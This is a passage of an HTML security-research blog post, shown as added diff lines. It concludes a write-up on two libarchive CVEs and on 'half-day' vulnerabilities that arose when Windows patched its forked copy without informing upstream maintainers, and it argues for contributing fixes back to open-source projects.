+<p>As a result, after confirming that libarchive had closed the issue, we promptly applied for CVE identifiers for these vulnerabilities. The two vulnerabilities were assigned <a href="https://github.com/advisories/GHSA-rmj4-vvpv-4m33">CVE-2024-48957</a> and <a href="https://github.com/advisories/GHSA-9mw4-2ppr-4mcg">CVE-2024-48958</a>. By the time these were published, it was already October, six months after the patch had been released in April.</p>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>This article discusses the vulnerabilities and notable characteristics introduced when Windows adopted libarchive to support additional archive file formats.</p>
+
+<p>We also successfully exploited what we consider “Half-day” vulnerabilities in ClickHouse. These “Half-day” vulnerabilities arise from the fact that after Windows forked libarchive and compiled it into the closed-source archiveint.dll, it failed to promptly inform the libarchive maintainers or contribute the patch back to the upstream repository, leading to the creation of the “Half-day” vulnerability.</p>
+
+<p>The delayed fix in the upstream repository can be attributed to communication delays and the absence of a publicly available patch. The maintainers were only able to address the issue after receiving the report, by which point the forked version had already been patched. Therefore, after patching its forked version of libarchive, Microsoft should have not only notified the original maintainers but also submitted a Pull Request to the upstream repository to facilitate the fix.</p>
+
+<p>Libarchive maintainers are volunteers who may be unpaid. The open-source ethos encourages everyone to “share, collaborate, and contribute” (and much more). Thus, we believe that researchers should not only provide vulnerability analysis and PoCs but also actively propose fixes to help preserve the security and quality of open-source software when reporting vulnerabilities.</p>
+
+
+                    </div>
+                    <!-- 文章內容 -->
+                </div>
+            </article>
+            <!-- 文章 end -->
+        </section>
+        
+         <!-- 作者 -->
+        <section>
+            <div class="container article_footer">
+                <div class="author_info">
+                    <a href="/en/blog/author/terrynini">
+                        <div class="circle" style="background-image: url(/assets/img/avatar/orig/nini.png);"></div>
+                    </a>
+                    <div>
+                        <a class="author" href="/en/blog/author/terrynini">
+                            <h3>Terrynini</h3>
+                        </a>
+                        <span>Security Researcher</span>
+                        <p>
+                            I’m NiNi, hunting the demons that lurk in your binary every day. <br>๛ฅ(=ˇωˇ=)ฅ
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </section>
+        
+
+    </div>
+
+    <!-- footer -->
+    <footer>
+<div class="container footer">
+    <div class="logo">
+        <a href="/en/">
+            <img src="/images/logo.svg"/>
+        </a>
+        <div class="social">
+            <a href="https://www.facebook.com/D3VC0RE"><i class="icon facebook"></i></a>
+            <a href="https://twitter.com/d3vc0r3"><i class="icon twitter"></i></a>
+        </div>
+    </div>
+
+    <div class="column">
+        <h6 class="mobile_toggle">Services</h6>
+        <ul>
+            <li><a href="/en/services/red-team/">Red Team Assessment</a></li>
+            <li><a href="/en/services/penetration-test/">Penetration Testing</a></li>
+            <li><a href="/en/services/security-consulting/">Security Consulting</a></li>
+            <li><a href="/en/services/security-training/">Security Training</a></li>
+        </ul>
+    </div>
+
+    <div class="column">
+        <h6 class="mobile_toggle">Research</h6>
+        <ul>
+            <li><a href="/en/research/overview/">Overview</a></li>
+            <li><a href="/en/research/awards/">Competitions and Awards</a></li>
+            <li><a href="/en/research/bug-bounty/">Enterprise Vulnerability Reports</a></li>
+            <li><a href="/en/research/talks/">International Conferences</a></li>
+            <li><a href="/en/research/cve/">CVE List</a></li>
+        </ul>
+    </div>
+
+    <div class="column">
+        <h6 class="mobile_toggle">Company</h6>
+        <ul>
+            <li><a href="/en/company/about/">Company Overview</a></li>
+            <li><a href="/en/company/our-team/">Team Members</a></li>
+            <li><a href="/en/company/history/">Achievements</a></li>
+            <li><a href="/en/company/csr/">Corporate Social Responsibility</a></li>
+            <li><a href="/en/company/jobs/">Job Opportunities</a></li>
+            <li><a href="/en/contact/">Contact</a></li>
+        </ul>
+    </div>
+
+    <div class="column">
+        <h6 class="mobile_toggle">News</h6>
+        <ul>
+            <li><a href="/en/blog/">Blog</a></li>
+            <li><a href="/en/media-kit/">Media Resources</a></li>
+        </ul>
+    </div>
+
+    <!-- divider 分隔線 -->
+    <div class="divider"></div>
+
+    <div class="copyright">
+        <div class="info">
+            <span>© 2025 DEVCORE <b class="line-block">All rights reserved.</b></span>
+            <span><a href="/en/privacy-policy/">Privacy Policy</a></span>
+        </div>
+        <div class="lang">
+            <!-- <i class="icon translate"></i>
+            <select>
+                <option value="">Language</option>
+                <option value="">中文</option>
+                <option value="">English</option>
+            </select> -->
+            <span>Language :<a href="/">中文</a>|<a href="/en/">English</a></span>
+        </div>
+    </div>
+
+</div>
+    </footer>
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
